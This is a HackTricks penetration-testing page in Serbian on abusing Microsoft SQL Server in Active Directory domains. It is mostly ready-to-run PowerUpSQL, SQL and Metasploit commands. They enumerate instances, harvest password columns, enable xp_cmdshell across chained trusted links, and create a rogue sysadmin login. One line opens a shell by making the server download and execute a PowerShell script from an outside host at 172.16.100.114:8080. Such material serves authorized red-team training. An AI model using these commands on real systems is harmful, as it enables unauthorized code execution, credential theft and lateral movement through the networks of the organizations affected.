# MSSQL AD Abuse

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **MSSQL Enumeracija / Otkrivanje**

Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma koristan u ovom slučaju.

```powershell
Import-Module .\PowerupSQL.psd1
```

### Nabrajanje sa mreže bez sesije domena

```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```

### Nabrojavanje iznutra domena

```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

## Osnovno zloupotreba MSSQL

### Pristup bazi podataka

```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

### MSSQL RCE

Moguće je takođe **izvršiti komande** unutar MSSQL hosta

```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```

### MSSQL Osnovni trikovi hakovanja

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Povereni linkovi

Ako je instanca MSSQL-a poverena (link baze podataka) drugoj instanci MSSQL-a. Ako korisnik ima privilegije nad poverenom bazom podataka, moći će **iskoristiti povereni odnos da izvršava upite i na drugoj instanci**. Ovi povereni linkovi mogu biti povezani u lancu i u nekom trenutku korisnik može pronaći nekonfigurisanu bazu podataka gde može izvršavati komande.

**Veze između baza podataka funkcionišu čak i preko poverenja šuma.**

### Zloupotreba Powershella

```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```

### Metasploit

Možete lako proveriti pouzdane veze koristeći metasploit.

```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

Primetite da će metasploit pokušati da zloupotrebi samo funkciju `openquery()` u MSSQL (tako da, ako ne možete izvršiti naredbu pomoću `openquery()`, moraćete ručno isprobati metodu `EXECUTE` za izvršavanje naredbi, više detalja ispod.)

### Ručno - Openquery()

Sa **Linuxa** možete dobiti konzolu za MSSQL pomoću **sqsh** i **mssqlclient.py.**

Sa **Windowsa** takođe možete pronaći linkove i ručno izvršavati naredbe koristeći **MSSQL klijent kao što je** [**HeidiSQL**](https://www.heidisql.com)

_Prijavite se koristeći Windows autentifikaciju:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Pronalaženje pouzdanih linkova

```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```

![](<../../.gitbook/assets/image (168).png>)

#### Izvršavanje upita na pouzdanom linku

Izvršite upite putem linka (primer: pronađite više linkova u novom pristupačnom primeru):

```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```

{% hint style="warning" %}
Proverite gde se koriste dvostruki i jednostruki navodnici, važno je koristiti ih na taj način.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Možete nastaviti ovaj lanac pouzdanih veza zauvek ručno.

```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```

### Uputstvo - IZVRŠI

Takođe možete zloupotrebiti poverene veze koristeći `EXECUTE`:

```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## Lokalno eskaliranje privilegija

**MSSQL lokalni korisnik** obično ima poseban tip privilegije nazvan **`SeImpersonatePrivilege`**. Ovo omogućava nalogu da "impersonira klijenta nakon autentikacije".

Strategija koju su mnogi autori osmislili je da prisile **sistemski servis** da se autentikuje na lažni ili "man-in-the-middle" servis koji napadač kreira. Ovaj lažni servis može zatim da impersonira sistemski servis dok pokušava da se autentikuje.

[SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju različitih tehnika koje se mogu izvršiti putem Beacon-ove komande `execute-assembly`.
